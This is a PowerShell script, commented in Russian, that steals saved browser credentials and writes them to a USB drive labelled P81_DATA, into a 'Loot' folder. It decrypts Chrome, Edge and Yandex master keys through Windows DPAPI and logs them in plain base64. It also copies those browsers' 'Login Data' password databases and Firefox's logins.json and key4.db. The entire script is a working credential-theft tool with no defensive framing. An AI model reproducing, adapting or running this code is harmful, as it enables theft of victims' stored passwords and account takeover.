# 1. Поиск флешки P81_DATA
$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq 'P81_DATA' } | Select-Object -ExpandProperty DriveLetter
if (!$usb) { exit }

# 2. Папка назначения
$time = Get-Date -Format "HH_mm_ss"
$dest = "$($usb):\Loot\$time"
New-Item -ItemType Directory -Path $dest -Force | Out-Null
$logFile = "$dest\keys_report.log"

# Подгружаем сборку для работы с DPAPI
Add-Type -AssemblyName System.Security

# 3. Сбор Chromium (Chrome, Edge, Yandex)
$browsers = @(
    @{n="CHROME"; p="Google\Chrome\User Data"},
    @{n="EDGE"; p="Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $uPath = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $uPath) {
        $prefix = $b.n
        
        # Обработка Мастер-ключа
        $lsPath = Join-Path $uPath "Local State"
        if (Test-Path $lsPath) {
            try {
                # Копируем физический файл
                Copy-Item $lsPath -Destination "$dest\$($prefix)_MASTER_KEY" -Force
                
                # Извлекаем ключ в .log для удобства
                $json = Get-Content $lsPath -Raw | ConvertFrom-Json
                $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($json.os_crypt.encrypted_key).Length-1)]
                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                $base64Key = [Convert]::ToBase64String($masterKey)
                
                "[$prefix] Master Key: $base64Key" | Out-File -FilePath $logFile -Append -Encoding UTF8
            } catch {
                "[$prefix] Error extracting key: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append -Encoding UTF8
            }
        }
        
        # Копируем базы паролей
        Get-ChildItem -Path $uPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $profile = $_.Directory.Name
            Copy-Item $_.FullName -Destination "$dest\$($prefix)_$($profile)_LOGINS.db" -Force -ErrorAction SilentlyContinue
        }
    }
}

# 4. Сбор Firefox (без изменений)
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
        $p = $_.FullName
        Copy-Item (Join-Path $p "logins.json") -Destination "$dest\FF_$($_.Name)_logins.json" -ErrorAction SilentlyContinue
        Copy-Item (Join-Path $p "key4.db") -Destination "$dest\FF_$($_.Name)_key4.db" -ErrorAction SilentlyContinue
    }
}

exit
